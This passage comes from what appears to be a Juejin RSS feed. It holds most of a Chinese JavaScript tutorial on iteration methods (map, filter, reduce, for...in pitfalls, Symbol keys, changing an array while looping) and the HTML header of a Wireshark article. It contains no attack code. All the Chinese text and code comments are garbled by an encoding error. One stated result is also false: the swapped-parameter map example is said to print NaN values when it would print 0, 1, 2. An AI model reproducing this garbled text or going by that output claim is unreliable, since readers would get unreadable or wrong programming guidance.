  }
});

<span class="hljs-comment">// æ¨è</span>
<span class="hljs-keyword">const</span> result = arr.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> num % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> num * <span class="hljs-number">2</span>);
</code></pre>
</li>
</ul>
</li>
</ol>
<h4 data-id="heading-27">å‡½æ•°å¼ç¼–ç¨‹æœ€ä½³å®è·µ</h4>
<ol>
<li>
<p><strong>ä½¿ç”¨çº¯å‡½æ•°</strong></p>
<ul>
<li>
<p>å›è°ƒå‡½æ•°ä¸åº”ä¿®æ”¹å¤–éƒ¨å˜é‡æˆ–åŸæ•°ç»„ï¼Œä»…ä¾èµ–è¾“å…¥å‚æ•°è¿”å›ç»“æœã€‚</p>
</li>
<li>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// çº¯å‡½æ•°ï¼ˆæ¨èï¼‰</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">double</span> = num =&gt; num * <span class="hljs-number">2</span>;
<span class="hljs-keyword">const</span> doubled = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>].<span class="hljs-title function_">map</span>(double);

<span class="hljs-comment">// éçº¯å‡½æ•°ï¼ˆä¸æ¨èï¼‰</span>
<span class="hljs-keyword">let</span> total = <span class="hljs-number">0</span>;
[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>].<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> {
  total += num; <span class="hljs-comment">// ä¿®æ”¹å¤–éƒ¨å˜é‡</span>
});
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>é¿å…å›è°ƒåœ°ç‹±</strong></p>
<ul>
<li>
<p>å¤šå±‚<code>forEach</code>åµŒå¥—ä¼šé™ä½ä»£ç å¯è¯»æ€§ï¼Œå¯ä½¿ç”¨<code>map</code>ã€<code>filter</code>ã€<code>reduce</code>ç»„åˆæ›¿ä»£ã€‚</p>
</li>
<li>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä¸æ¨èï¼ˆåµŒå¥—forEachï¼‰</span>
<span class="hljs-keyword">const</span> data = [
  { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">items</span>: [<span class="hljs-number">10</span>, <span class="hljs-number">20</span>] },
  { <span class="hljs-attr">id</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">items</span>: [<span class="hljs-number">30</span>, <span class="hljs-number">40</span>] }
];
<span class="hljs-keyword">const</span> result = [];
data.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> {
  item.<span class="hljs-property">items</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> {
    result.<span class="hljs-title function_">push</span>(num * <span class="hljs-number">2</span>);
  });
});

<span class="hljs-comment">// æ¨èï¼ˆreduce + mapï¼‰</span>
<span class="hljs-keyword">const</span> result = data.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, item</span>) =&gt;</span> {
  <span class="hljs-keyword">return</span> [...acc, ...item.<span class="hljs-property">items</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> num * <span class="hljs-number">2</span>)];
}, []);
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>åˆç†ä½¿ç”¨è§£æ„èµ‹å€¼</strong></p>
<ul>
<li>
<p>éå†å¯¹è±¡é”®å€¼å¯¹æ—¶ï¼Œä½¿ç”¨è§£æ„èµ‹å€¼ç®€åŒ–ä»£ç ã€‚</p>
</li>
<li>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(obj).<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">[key, value]</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${key}</span>: <span class="hljs-subst">${value}</span>`</span>);
});
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>å¤„ç†è¾¹ç•Œæƒ…å†µ</strong></p>
<ul>
<li>
<p>æ•°ç»„ä¸ºç©ºæ—¶ï¼Œ<code>reduce</code>å¿…é¡»æä¾›åˆå§‹å€¼ï¼Œé¿å…æŠ›å‡ºé”™è¯¯ã€‚</p>
</li>
<li>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ¨èï¼ˆæä¾›åˆå§‹å€¼ï¼‰</span>
<span class="hljs-keyword">const</span> sum = [].<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, num</span>) =&gt;</span> acc + num, <span class="hljs-number">0</span>); <span class="hljs-comment">// 0</span>

<span class="hljs-comment">// ä¸æ¨èï¼ˆæ— åˆå§‹å€¼ï¼Œç©ºæ•°ç»„ä¼šæŠ¥é”™ï¼‰</span>
<span class="hljs-keyword">const</span> sum = [].<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, num</span>) =&gt;</span> acc + num); <span class="hljs-comment">// TypeError</span>
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>æ€§èƒ½ä¼˜åŒ–</strong></p>
<ul>
<li>å¤§å‹æ•°ç»„ï¼ˆç™¾ä¸‡çº§å…ƒç´ ï¼‰éå†ä¼˜å…ˆä½¿ç”¨ä¼ ç»Ÿ for å¾ªç¯ï¼ˆå‡å°‘å‡½æ•°è°ƒç”¨å¼€é”€ï¼‰ã€‚</li>
<li>é¿å…åœ¨å›è°ƒå‡½æ•°ä¸­æ‰§è¡Œå¤æ‚æ“ä½œï¼Œå¯æå‰æå–é€»è¾‘æˆ–ç¼“å­˜ä¸­é—´ç»“æœã€‚</li>
</ul>
</li>
</ol>
<h3 data-id="heading-28">å¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ</h3>
<h4 data-id="heading-29">1. for...in éå†æ•°ç»„æ—¶çš„é—®é¢˜</h4>
<p><strong>é—®é¢˜</strong>ï¼šä½¿ç”¨ for...in éå†æ•°ç»„æ—¶ï¼Œä¼šéå†åˆ°æ•°ç»„çš„éæ•°å­—å±æ€§ï¼ˆå¦‚è‡ªå®šä¹‰å±æ€§ã€åŸå‹é“¾å±æ€§ï¼‰ï¼Œå¯¼è‡´æ„å¤–ç»“æœã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
arr.<span class="hljs-property">test</span> = <span class="hljs-string">'value'</span>; <span class="hljs-comment">// æ·»åŠ éæ•°å­—å±æ€§</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">gender</span> = <span class="hljs-string">'female'</span>; <span class="hljs-comment">// åŸå‹é“¾æ·»åŠ å±æ€§</span>

<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> arr) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key); <span class="hljs-comment">// è¾“å‡º: 0, 1, 2, 'test', 'gender'</span>
}
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<ul>
<li>
<p>ä½¿ç”¨<code>for...of</code>éå†æ•°ç»„ï¼ˆä»…éå†æ•°å­—ç´¢å¼•å±æ€§ï¼‰ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> num <span class="hljs-keyword">of</span> arr) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num); <span class="hljs-comment">// è¾“å‡º: 1, 2, 3</span>
}
</code></pre>
</li>
<li>
<p>ä½¿ç”¨<code>Object.keys()</code>è¿‡æ»¤æ•°å­—ç´¢å¼•ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(arr).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> {
  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isNaN</span>(<span class="hljs-title class_">Number</span>(key))) { <span class="hljs-comment">// ä»…å¤„ç†æ•°å­—ç´¢å¼•</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr[key]); <span class="hljs-comment">// è¾“å‡º: 1, 2, 3</span>
  }
});
</code></pre>
</li>
<li>
<p>é¿å…ç»™æ•°ç»„æ·»åŠ éæ•°å­—å±æ€§ï¼ˆéµå¾ªæ•°ç»„çš„è®¾è®¡åˆè¡·ï¼‰ã€‚</p>
</li>
</ul>
<h4 data-id="heading-30">2. reduce () æ–¹æ³•çš„åˆå§‹å€¼é—®é¢˜</h4>
<p><strong>é—®é¢˜</strong>ï¼šreduce () æ–¹æ³•åœ¨æ•°ç»„ä¸ºç©ºæˆ–æœªæä¾›åˆå§‹å€¼æ—¶ï¼Œè¡Œä¸ºä¸ç¬¦åˆé¢„æœŸã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript">
<span class="hljs-comment">// é—®é¢˜1ï¼šç©ºæ•°ç»„æ— åˆå§‹å€¼ â†’ æŠ›å‡ºTypeError</span>
[].<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, num</span>) =&gt;</span> acc + num); <span class="hljs-comment">// Uncaught TypeError: Reduce of empty array with no initial value</span>

<span class="hljs-comment">// é—®é¢˜2ï¼šæ•°ç»„åªæœ‰ä¸€ä¸ªå…ƒç´ æ— åˆå§‹å€¼ â†’ ç›´æ¥è¿”å›è¯¥å…ƒç´ ï¼Œä¸è°ƒç”¨å›è°ƒ</span>
[<span class="hljs-number">5</span>].<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, num</span>) =&gt;</span> acc + num); <span class="hljs-comment">// 5ï¼ˆå›è°ƒæœªæ‰§è¡Œï¼‰</span>
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<ul>
<li>
<p>å§‹ç»ˆæä¾›åˆå§‹å€¼ï¼ˆæ¨èï¼‰ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> sum = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>].<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, num</span>) =&gt;</span> acc + num, <span class="hljs-number">0</span>); <span class="hljs-comment">// 6</span>
<span class="hljs-keyword">const</span> emptySum = [].<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, num</span>) =&gt;</span> acc + num, <span class="hljs-number">0</span>); <span class="hljs-comment">// 0ï¼ˆæ— é”™è¯¯ï¼‰</span>
</code></pre>
</li>
<li>
<p>æ˜ç¡®å¤„ç†è¾¹ç•Œæƒ…å†µï¼ˆæ•°ç»„å¯èƒ½ä¸ºç©ºæ—¶ï¼‰ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> array = [];
<span class="hljs-keyword">const</span> sum = array.<span class="hljs-property">length</span> === <span class="hljs-number">0</span> ? <span class="hljs-number">0</span> : array.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, num</span>) =&gt;</span> acc + num);
</code></pre>
</li>
</ul>
<h4 data-id="heading-31">3. Symbol é”®çš„éå†é—®é¢˜</h4>
<p><strong>é—®é¢˜</strong>ï¼šSymbol ç±»å‹çš„é”®æ— æ³•è¢«<code>for...in</code>ã€<code>Object.keys()</code>ç­‰æ–¹æ³•æ•è·ï¼Œå¯¼è‡´éå†ä¸å®Œæ•´ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> obj = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span>,
  [<span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'id'</span>)]: <span class="hljs-number">123</span>,
  [<span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'secret'</span>)]: <span class="hljs-string">'abc'</span>
};

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(obj)); <span class="hljs-comment">// è¾“å‡º: ['name']ï¼ˆæœªåŒ…å«Symbolé”®ï¼‰</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> obj) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key); <span class="hljs-comment">// è¾“å‡º: 'name'ï¼ˆæœªåŒ…å«Symbolé”®ï¼‰</span>
}
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<ul>
<li>
<p>ä½¿ç”¨<code>Reflect.ownKeys()</code>éå†æ‰€æœ‰è‡ªæœ‰å±æ€§é”®ï¼ˆåŒ…æ‹¬ Symbolï¼‰ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> allKeys = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(obj);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(allKeys); <span class="hljs-comment">// è¾“å‡º: ['name', Symbol(id), Symbol(secret)]</span>
</code></pre>
</li>
<li>
<p>ä½¿ç”¨<code>Object.getOwnPropertySymbols()</code>ä¸“é—¨è·å– Symbol é”®ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> symbols = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertySymbols</span>(obj);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(symbols); <span class="hljs-comment">// è¾“å‡º: [Symbol(id), Symbol(secret)]</span>
</code></pre>
</li>
</ul>
<h4 data-id="heading-32">4. é«˜é˜¶å‡½æ•°çš„å›è°ƒå‚æ•°è¯¯ç”¨</h4>
<p><strong>é—®é¢˜</strong>ï¼šmapã€filter ç­‰é«˜é˜¶å‡½æ•°çš„å›è°ƒå‚æ•°è¯¯ç”¨ï¼ˆå¦‚æ··æ·†å‚æ•°é¡ºåºã€é—æ¼å‚æ•°ï¼‰ï¼Œå¯¼è‡´æ„å¤–ç»“æœã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript">
<span class="hljs-comment">// é—®é¢˜1ï¼šmapå›è°ƒå‚æ•°é¡ºåºé”™è¯¯ï¼ˆè¯¯å°†indexä½œä¸ºvalueï¼‰</span>
<span class="hljs-keyword">const</span> numbers = [<span class="hljs-string">'1'</span>, <span class="hljs-string">'2'</span>, <span class="hljs-string">'3'</span>];
<span class="hljs-keyword">const</span> parsed = numbers.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">index, value</span>) =&gt;</span> <span class="hljs-built_in">parseInt</span>(value)); 
<span class="hljs-comment">// è¾“å‡º: [NaN, NaN, NaN]ï¼ˆå‚æ•°é¡ºåºé¢ å€’ï¼‰</span>

<span class="hljs-comment">// é—®é¢˜2ï¼šfilterå›è°ƒæœªè¿”å›å¸ƒå°”å€¼</span>
<span class="hljs-keyword">const</span> evenNumbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>].<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> {
  num % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>; <span class="hljs-comment">// é—æ¼returnï¼Œé»˜è®¤è¿”å›undefined â†’ è½¬æ¢ä¸ºfalse</span>
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(evenNumbers); <span class="hljs-comment">// è¾“å‡º: []ï¼ˆæ‰€æœ‰å…ƒç´ éƒ½è¢«è¿‡æ»¤ï¼‰</span>
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<ul>
<li>
<p>æ˜ç¡®å›è°ƒå‡½æ•°å‚æ•°é¡ºåºï¼š</p>
<ul>
<li>map/filter å›è°ƒï¼š<code>(currentValue, index, array)</code>ï¼›</li>
<li>reduce å›è°ƒï¼š<code>(accumulator, currentValue, index, array)</code>ã€‚</li>
</ul>
</li>
<li>
<p>ç¡®ä¿ filter å›è°ƒè¿”å›å¸ƒå°”å€¼ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ­£ç¡®ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> parsed = numbers.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> <span class="hljs-built_in">parseInt</span>(value)); <span class="hljs-comment">// è¾“å‡º: [1, 2, 3]</span>
<span class="hljs-keyword">const</span> evenNumbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>].<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> num % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>); <span class="hljs-comment">// è¾“å‡º: [2, 4]</span>
</code></pre>
</li>
</ul>
<h4 data-id="heading-33">5. éå†è¿‡ç¨‹ä¸­ä¿®æ”¹æ•°ç»„çš„é—®é¢˜</h4>
<p><strong>é—®é¢˜</strong>ï¼šåœ¨<code>forEach</code>ã€<code>for...of</code>ç­‰å¾ªç¯ä¸­ä¿®æ”¹æ•°ç»„ï¼ˆå¦‚åˆ é™¤ã€æ·»åŠ å…ƒç´ ï¼‰ï¼Œå¯¼è‡´éå†ä¸å®Œæ•´æˆ–é‡å¤éå†ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// é—®é¢˜ï¼šåˆ é™¤å…ƒç´ åï¼Œæ•°ç»„é•¿åº¦å˜åŒ–ï¼Œå¯¼è‡´æŸäº›å…ƒç´ è¢«è·³è¿‡</span>
<span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];
arr.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">num, index</span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (num % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>) {
    arr.<span class="hljs-title function_">splice</span>(index, <span class="hljs-number">1</span>); <span class="hljs-comment">// åˆ é™¤å½“å‰å…ƒç´ </span>
  }
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr); <span class="hljs-comment">// è¾“å‡º: [1, 3, 5]ï¼Ÿå®é™…è¾“å‡º: [1, 3, 5]ï¼ˆçœ‹ä¼¼æ­£ç¡®ï¼Œä½†é€»è¾‘æœ‰é£é™©ï¼‰</span>

<span class="hljs-comment">// é—®é¢˜å‡çº§ï¼šæ•°ç»„é•¿åº¦å˜åŒ–å¯¼è‡´éå†å¼‚å¸¸</span>
<span class="hljs-keyword">const</span> arr2 = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; arr2.<span class="hljs-property">length</span>; i++) {
  <span class="hljs-keyword">if</span> (arr2[i] === <span class="hljs-number">2</span>) {
    arr2.<span class="hljs-title function_">splice</span>(i, <span class="hljs-number">1</span>); <span class="hljs-comment">// åˆ é™¤ç´¢å¼•1çš„å…ƒç´ ï¼Œæ•°ç»„å˜ä¸º[1,3,4,5]</span>
  }
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr2[i]); <span class="hljs-comment">// è¾“å‡º: 1, 3, 4, 5ï¼ˆè·³è¿‡äº†3ä¹‹åçš„å…ƒç´ ï¼Ÿå®é™…è¾“å‡ºï¼š1,3,4,5ï¼‰</span>
}
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<ul>
<li>
<p>ä½¿ç”¨<code>filter</code>åˆ›å»ºæ–°æ•°ç»„ï¼ˆæ¨èï¼Œæ— å‰¯ä½œç”¨ï¼‰ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];
<span class="hljs-keyword">const</span> filtered = arr.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> num % <span class="hljs-number">2</span> !== <span class="hljs-number">0</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(filtered); <span class="hljs-comment">// è¾“å‡º: [1, 3, 5]ï¼ˆåŸæ•°ç»„ä¸å˜ï¼‰</span>
</code></pre>
</li>
<li>
<p>ä¼ ç»Ÿ for å¾ªç¯ä»åå¾€å‰éå†ï¼ˆä¿®æ”¹åŸæ•°ç»„æ—¶ï¼‰ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = arr.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) {
  <span class="hljs-keyword">if</span> (arr[i] % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>) {
    arr.<span class="hljs-title function_">splice</span>(i, <span class="hljs-number">1</span>); <span class="hljs-comment">// ä»åå¾€å‰åˆ é™¤ï¼Œä¸å½±å“å‰é¢çš„ç´¢å¼•</span>
  }
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr); <span class="hljs-comment">// è¾“å‡º: [1, 3, 5]</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-34">ç»“è®º</h3>
<p>JavaScript æä¾›äº†ä¸°å¯Œçš„éå†æ–¹æ³•ï¼Œæ¯ç§æ–¹æ³•éƒ½æœ‰å…¶ç‹¬ç‰¹çš„é€‚ç”¨åœºæ™¯å’Œä¼˜ç¼ºç‚¹ã€‚æŒæ¡è¿™äº›æ–¹æ³•çš„æ ¸å¿ƒå·®å¼‚å’Œæœ€ä½³å®è·µï¼Œèƒ½å¸®åŠ©å¼€å‘è€…ç¼–å†™æ›´é«˜æ•ˆã€æ›´å®‰å…¨ã€æ›´æ˜“ç»´æŠ¤çš„ä»£ç ã€‚</p>
<h4 data-id="heading-35">æ ¸å¿ƒæ€»ç»“</h4>
<ul>
<li>
<p><strong>å¯¹è±¡éå†</strong>ï¼šä¼˜å…ˆä½¿ç”¨<code>Object.keys()</code>/<code>values()</code>/<code>entries()</code>ï¼ˆå®‰å…¨ã€é«˜æ•ˆï¼‰ï¼Œé¿å…<code>for...in</code>ï¼›éœ€éå†æ‰€æœ‰è‡ªæœ‰å±æ€§ï¼ˆåŒ…æ‹¬ä¸å¯æšä¸¾ã€Symbolï¼‰æ—¶ä½¿ç”¨<code>Reflect.ownKeys()</code>ã€‚</p>
</li>
<li>
<p><strong>æ•°ç»„éå†</strong>ï¼š</p>
<ul>
<li>éœ€æ§åˆ¶ç´¢å¼•æˆ–ä¸­æ–­å¾ªç¯ï¼šä¼ ç»Ÿ for å¾ªç¯ï¼›</li>
<li>ä»…éå†å…ƒç´ ï¼š<code>for...of</code>ï¼›</li>
<li>è½¬æ¢å…ƒç´ ï¼š<code>map()</code>ï¼›</li>
<li>ç­›é€‰å…ƒç´ ï¼š<code>filter()</code>ï¼›</li>
<li>ç´¯ç§¯è®¡ç®—ï¼š<code>reduce()</code>ï¼›</li>
<li>å‡½æ•°å¼ç¼–ç¨‹ï¼šä¼˜å…ˆç»„åˆä½¿ç”¨<code>map</code>ã€<code>filter</code>ã€<code>reduce</code>ã€‚</li>
</ul>
</li>
<li>
<p><strong>ESLint è§„èŒƒ</strong>ï¼šéµå¾ª<code>no-for-in</code>ã€<code>prefer-map</code>ç­‰è§„åˆ™ï¼Œé¿å…å¸¸è§é”™è¯¯ã€‚</p>
</li>
<li>
<p><strong>æœ€ä½³å®è·µ</strong>ï¼šä½¿ç”¨çº¯å‡½æ•°ã€é¿å…å‰¯ä½œç”¨ã€å¤„ç†è¾¹ç•Œæƒ…å†µï¼ˆå¦‚ç©ºæ•°ç»„ã€Symbol é”®ï¼‰ã€‚</p>
</li>
</ul>
<p>åœ¨å®é™…å¼€å‘ä¸­ï¼Œåº”æ ¹æ®å…·ä½“éœ€æ±‚ï¼ˆå¦‚æ˜¯å¦éœ€è¦ç´¢å¼•ã€æ˜¯å¦ä¿®æ”¹æ•°ç»„ã€æ˜¯å¦è¿”å›ç»“æœï¼‰é€‰æ‹©åˆé€‚çš„éå†æ–¹æ³•ï¼Œé¿å…ç›²ç›®è¿½æ±‚ â€œæµè¡Œâ€ æ–¹æ³•ã€‚åŒæ—¶ï¼Œç»“åˆ ESLint ç­‰å·¥å…·ç¡®ä¿ä»£ç è§„èŒƒï¼Œæé«˜ä»£ç è´¨é‡å’Œå›¢é˜Ÿåä½œæ•ˆç‡ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Wireshark TS | è¶…æ—¶é‡ä¼ æ—¶é—´ä¸ç¿»å€]]></title>    <link>https://juejin.cn/post/7589962224795762726</link>    <guid>https://juejin.cn/post/7589962224795762726</guid>    <pubDate>2026-01-02T06:38:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589962224795762726" data-draft-id="7589958976226557962" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Wireshark TS | è¶…æ—¶é‡ä¼ æ—¶é—´ä¸ç¿»å€"/> <meta itemprop="keywords" content="Wireshark,TCP/IP,ç½‘ç»œåè®®"/> <meta itemprop="datePublished" content="2026-01-02T06:38:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="7ACE"/> <meta itemprop="url" content="https://juejin.cn/user/4033458369739741"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Wireshark TS | è¶…æ—¶é‡ä¼ æ—¶é—´ä¸ç¿»å€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4033458369739741/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    7ACE
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T06:38:01.000Z" title="Fri Jan 02 2026 06:38:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
